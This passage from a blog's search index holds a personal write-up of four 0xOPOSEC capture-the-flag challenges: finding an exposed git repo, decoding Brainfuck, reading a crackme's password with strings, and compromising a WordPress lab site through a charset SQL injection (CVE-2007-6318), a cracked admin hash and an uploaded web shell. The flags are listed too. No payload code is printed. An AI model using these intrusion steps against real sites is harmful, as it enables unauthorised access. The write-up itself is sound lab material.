        "content": "\u0026ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.\u0026rdquo;\nRecon Have_a_l00k This first challenge was all about having a l00k(literally). They gave an URL to work with. When I opened the page I saw a video and a button.\nI pressed the button and the website redirected me to another page as shown below.The new page contained a video and nothing more. I noticed that the URL was diferent so maybe that would mean something.\nI decided to run dirsearch and I found a git repo with some interesting content such has index. I checked all the files, but the index was the file that caught my attention.\nNext thing I did was to download index file to my Desktop. After that I used \u0026ldquo;strings\u0026rdquo; to see if there was anything useful for me. The result from \u0026ldquo;strings\u0026rdquo; is down below and shows us one page(8JUCv3fZ44.html).\nCopied and pasted the output link and then another page with a video of Jigsaw is shown. Hmmmm but how about the flag? Well, I tried to see if there was anything in the source code, and we got our flag.\nflag{Bro_Do_you_even_git?} Misc Lost in Translation The second challenge was called \u0026ldquo;Lost in Translation\u0026rdquo;. I noticed why the title was called that way since i couldnt understand anything that was displayed in the challenge page. I see another video and some \u0026ldquo;random\u0026rdquo; chars.\nI was confused, I looked everywhere and nothing \u0026hellip; then I asked for some hints in Slack and they said \u0026ldquo;Programming with 8 instructions can fuck your brain up\u0026rdquo;. Copy and pasted that hint to google and the first result was \u0026ldquo;BrainFuck\u0026rdquo;.\nTricky uh? After reading about BrainFuck and understanding the problem, I simply used an online decoder and i got another flag!!!\nflag{Brain_F*ck_is_Beautiful} Reverse Crack me if you Can Next challenge was pretty straight forward and not that hard. The page had a video, a message (threatening) and a file to crack.\nI downloaded the file and checked what kind of file I was going to work on. With file command i was able to see his format.\nfile crackmeifucan\nI assigned runing permissions on the executable (sudo chmod +x crackmeifucan) to run it. The program asked a password, but I didnt knew what was that password so I just randomly typed qwerty. LOGIN FAILED!!! I decided to use strings command.\nstrings crackmeifucan\nThen I cleaned that string and the final result was Rev3ngineering1sc00l. I double checked the program once again and I even used bless to see if I was right. And finally another flag!!!\nflag{RevEng_FTW} Web We love Web 2.0 The next challenge was a Web-type challenge. They gave us a wordpress site and we had to find a way to exploit it. The site had some posts and some pictures.\nI used dirsearch and i\u0026rsquo;ve found some cool stuff like a directory list but it was useless because I couldn\u0026rsquo;t extract any information from those files. Then I looked for installed plugins (since many plugins from wordpress are vulnerable) and I found akismet plugin. I tried to exploit akismet with some XSS payloads but nothing worked. Another thing I knew was that the user for the admin was \u0026ldquo;admin\u0026rdquo; since I only got the wrong password error. Next step was to use wpscan and I found a WordPress 2.3.1 - Charset SQL Injection Vuln (CVE-2007-6318).\nMost database query in WordPress uses escape() method to sanitize SQL string, which is essentially filtering input via addslashes() function. However addslashes() fails to consider character set used in SQL string, and blindly inserts backslash before any single quote, regardless of whether such backslashes will form another valid character or not.\nAfter that I injected the payload in the search field and the output looked like a md5 hash. Decoding the hash gave me the result: P@ssw0rd123. So i could finally login.\nNext step was to find the flag. I looked in the backoffice but I was looking in the wrong place. After googling a bit I decided that I should upload a shell. To locate the flag I used a locate comand to find any txt file in the root dir.\nI noticed that the first result was the flag so the next thing I did was use cat to see the content of that text file and move to another challenge.\nflag{AinT_Wordpress_Secure?} ", 
        "url": "http:\/\/localhost:1313\/posts\/2018-08-21-0xoposec\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
}
</script>


    <script defer src="/js/lunr.js"></script>
    <script defer src="/js/search.js"></script>


</footer>

</body>
</html>

